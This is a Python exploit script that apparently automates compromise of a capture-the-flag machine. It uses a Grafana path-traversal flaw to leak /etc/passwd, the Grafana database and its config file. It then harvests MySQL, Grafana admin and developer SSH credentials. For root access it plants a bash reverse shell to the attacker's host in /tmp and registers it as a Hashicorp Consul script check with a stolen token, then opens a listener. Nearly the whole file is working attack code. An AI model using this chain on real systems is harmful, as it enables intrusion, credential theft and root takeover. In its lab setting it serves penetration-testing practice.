#!/usr/bin/env python3


import requests # for http/s requests.
import sys # for system.
import os # for os commands.
import sqlite3 # for sqlite.
import mysql.connector # for mysql.
from base64 import b64decode # for decode base64.
import paramiko # for ssh connection.
from time import sleep # for wait.
import netifaces # for find the host ip address.
import socket # for listening
from threading import Thread # for thearding
from colorama import Fore as fg # for design output.
from colorama import Back as bg # for design output.
from colorama import Style as style # for design output.

# CHANGE THE PORT AND THE HOST IF YOU WANT. **EVEN IF YOU WILL NOT CHANGE THIS VERIABLES THE SCRIPT WILL WORK**.
OUTPT_COLOR = fg.RED+bg.WHITE+style.BRIGHT
HOST= netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
PORT = 4444








def reverse_shell_listener():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((HOST, PORT))
	s.listen(1)
	print("Listening on port "+str(PORT))
	conn, addr = s.accept()
	print('Connection reciveed from ', addr)

	while True:
		ans = conn.recv(1024).decode()
		sys.stdout.write(ans)
		command = input()
		command += "\n"
		conn.send(command.encode())
		sleep(1)
		sys.stdout.write("\033[A" + ans.split('\n')[-1])


# check if user specify the IP_TARGET.
def valid_parms():
	help_massage = OUTPT_COLOR + "[+] " + "usage: python3 %s [IP_TARGET]"%sys.argv[0]
	try:
		target = sys.argv[1]
		if target == '-h' or target == '--help':
			print(help_massage)
			sys.exit(0)
	except IndexError:
		print(help_massage)
		sys.exit(0)


# create the loot folder.
def create_loot_folder():
	try:
		os.mkdir(os.getcwd() + "/loot")
	except FileExistsError:
		pass

# save files.
def save_file(file_name, content):
	# check the content type.
	if type(content) == bytes:
		mode = 'wb'
	else:
		mode = 'w'
	with open(os.getcwd()+"/loot/%s"%file_name, mode) as my_file:
		my_file.write(content)


# this function leakage files from the server using the abritrary file vulnerability in grafana service.
def file_leakage(file_name):
	# check if a connection can be  established to the target.
	try:
		is_connection_established = False
		requests.get("http://%s:80"%sys.argv[1])
		is_connection_established = True
	# if connection cenot be established print the user to check the validation of the address target and the vpn connection and exit.
	except:
		print(OUTPT_COLOR + '[+]' + "could not success to established connection to the target please check your vpn connection and valid the target address!.")
		sys.exit(0)

	# if connection established the leake the files.
	finally:
		if is_connection_established:
			service_port = "3000"
			target = sys.argv[1]
			url = f"http://{target}:{service_port}" 
			payload = "/public/plugins/text/../../../../../../../../../../../../../%s" %file_name
			
			# starting session and usuing the prepare metod to not automaticlly "fixing" the url request parameter.
			s = requests.Session()
			r = requests.Request(method='GET', url=url)
			prepare = r.prepare()
			prepare.url = url+payload
			response = s.send(prepare)

			# check if the response contente is binary by the Content-Type headers and return rhe content and the write mode.
			if response.headers["Content-Type"]  == "application/octet-stream":
				return response.content
			else:
				return response.text
		


# function for making sqlite3 querys and reriving the username and the password for the mysql service.
def reteive_mysql_pass():
	# connecting to the database.
	connection = sqlite3.connect(os.getcwd() + "/loot/grafana.db")
	# setting the cursor to make query and get response content.
	cursor = connection.cursor()
	# making query.
	query = "select *from data_source;"
	cursor.execute(query)
	# fatch the response.
	response = cursor.fetchall()
	mysql_username = response[0][8]
	mysql_password = response[0][7]
	return [mysql_username, mysql_password]
	


# function for search line conntent by keyword.
def search_content(file_name, word):
	# results list.
	results = []

	# search word in file line by line.
	with open(os.getcwd() + "/loot/%s"%file_name, 'r') as my_file:
		for line in my_file.readlines():
			if word in line:
				results.append(line)

	# check if the list contain only one object and return it as string else return the all list.			
	if len(results) == 1:
		return results[0]
	else:
		return results


# dumping the developer user password from mysql service.
def retrive_developer_user_password(username, password):
	sys.tracebacklimit = 0
	# try to connect to mysql.
	try:
		# connecting to mysql.
		connection = mysql.connector.connect(host= sys.argv[1], user=username, password=password)

		# if the connection has made then retriving the password else existing and notifying the user to check the connection.
		if connection.is_connected():
			cursor = connection.cursor()
			cursor.execute("USE whackywidget;")
			cursor.execute("SELECT pass FROM users WHERE user='developer';")
			developer_password = cursor.fetchall()
	
	# if an error occured while connecting to mysql server then notify the user to check the connrction to the target and exit.
	except:
		# setting the stderr to false notifying the user and exit.
		sys.stderr = 0
		print(OUTPT_COLOR + "[+] " + "An error occured while connetint to MYSQL please make sure that you are connected to the vpn and try again!")
		sys.exit(0)

	# finanlly closing the connection to the mysql.
	finally:
		if connection.is_connected():
			cursor.close()
			connection.close()

	# decode the password from base64 into binary then from binray to plain text.
	return b64decode(developer_password[0][0]).decode().split('\n')[0]



# function to connect via ssh, running commands via the ssh connection and returning the output commnad as a string.
def ssh_developer_user(username, password, command):
	# initalize the ssh connection.
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	# connecting to the ssh.
	ssh.connect(hostname=sys.argv[1], username=username, password=password, look_for_keys=False)

	# running commmands.
	ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)
	# return the output as a string.
	return  ''.join(ssh_stdout.readlines())









# the main funcction.
def main():

	print(OUTPT_COLOR + """
	=====================================
		    FOOTHOLD
	=====================================\n\n""")

	# creating list for storing the all cresdentials that we can get.
	credentials = []

	# check if the user specify the necessary paramters.
	valid_parms()
	
	# creating the loot folder.
	create_loot_folder()
	print(OUTPT_COLOR + "[+] " +  "the path for the loot folder is: %s"%os.getcwd()+"/loot\n")
	
	# set files to leakage.
	file_list_for_leakage = ['/etc/passwd', '/var/lib/grafana/grafana.db', '/etc/grafana/grafana.ini']

	# leagage the files and saving them into the loot folder.
	for file in file_list_for_leakage:
		file_content = file_leakage(file)
		save_file(file_name=file.split('/')[-1], content=file_content)
		print(OUTPT_COLOR + "[+] " +  "leaking the file: %s\n"%file)
		
	# retriving and storing the mysql service credentials.	
	mysql_credentials = reteive_mysql_pass()
	print(OUTPT_COLOR + "[+] " + f"found credentials for mysql: [{mysql_credentials[0]} : {mysql_credentials[1]}]\n")
	# adding the mysql creds into the credentials list.
	credentials.append({"mysql credentials": mysql_credentials})
	
	# retriving the admin password from grafana.ini file.
	grafana_admin_passowrd = search_content(file_name='grafana.ini', word='admin_password').split('= ')[-1]
	print(OUTPT_COLOR + "[+] " + "found the admin credentials for grafana panel: [admin : %s]\n"%grafana_admin_passowrd.replace('\n', ''))

	# adding the grafana creds into the credentials list.
	credentials.append({"grafana credentials": ['admin', grafana_admin_passowrd]})
	
	# get all the users on the machine target.
	users_list = []
	for user in search_content(file_name='passwd', word='bash'):
		users_list.append(user.split(":")[0])
	print(OUTPT_COLOR + "[+] " +  "the users with bash shell on the target machine are: %s\n"%users_list)

	# retrive the developer password from mysql.
	developer_password = retrive_developer_user_password(username=mysql_credentials[0], password=mysql_credentials[-1])
	print(OUTPT_COLOR + "[+] " + "found the password for a user on the machine: [developer : %s]\n"%developer_password)
	# adding the developer user creds into the credentials list.
	credentials.append({"developer credentials": [users_list[1], developer_password]})

	# save the creds into the loot folder.
	save_file(file_name="credentials", content=str(credentials).replace('},','\n\n').replace('[{', '}]').replace('}]', '{').replace('{', ""))


	print(OUTPT_COLOR + """\n
	===============================
	     PRIVILEGE ESCALATION
	===============================\n\n""")

	# connecting to the developer user and running commands.
	grep_token = ssh_developer_user(username=users_list[-1], password=developer_password, command="cd /opt/my-app; git show|grep token")
	print(OUTPT_COLOR + "[+] " + "retrivng thr token for the vulnrable service)\n")
	# converting the data type of the veriable "grep token" from string to list.
	grep_token_list = grep_token.split(' ')
	
	# parsering the command output to catch the access token.
	access_token = grep_token_list[grep_token_list.index('--token') +1]
	print(OUTPT_COLOR + "[+] " + "found the access token: %s\n"%access_token)
	# creating a paylod that turn the permission of the /usr/bin/bash to SUID which allows as to run the /usr/bin/bash as root because the root is the owner of the /usr/bin/bash.
	payload_file_name = "evil.sh"
	create_file_payload = f"echo 'sleep 5;bash -i >& /dev/tcp/{HOST}/{PORT} 0>&1' > /tmp/{payload_file_name};chmod 777 /tmp/{payload_file_name}"
	ssh_developer_user(username=users_list[-1], password=developer_password, command=create_file_payload)
	print(OUTPT_COLOR + "[+] " + "creating the payload for the privilege escalation.\n")

	# create task in the vulnerabale service which is Hashicorp Consul (its based on API by PUT method request)
	# because the "enable_script_checks" set to true (you can find the file that contain the definition on  /etc/consul.d/consul.hcl) 
	# we can actually to create tasks as root because the service run in root permitions the service is listen
	# on the localhost on 8500 port which is the deafult port for this service now will triger the service to run the payload
	# that we created on /tmp/test.sh by sendeing a malicious request to the service we use in curl command for this.
	# there is an metasploite module for this, use in the command "searchsploit Hashicorp Consul" to find it.

	payload = """{"ID": "random name",
"Name": "random name",
"Address": "127.0.0.1",
"port": 80,
"check": {
"Args": ["/usr/bin/bash", "/tmp/%s"],
"interval": "10s",
"Timeout": "86400s"
}
}""".replace('\n', '')%payload_file_name
	





	print(OUTPT_COLOR + "[+] " + "sendenig the malicious code to the target to triger the payload.\n")
	request_payload = f"curl --header 'X-Consul-Token: {access_token}' -X PUT -d '{payload}' http://127.0.0.1:8500/v1/agent/service/register"
	
	ssh_developer_user(username=users_list[-1], password=developer_password, command=request_payload)
	reverse_shell_listener()
	





if __name__ == "__main__":
	main()
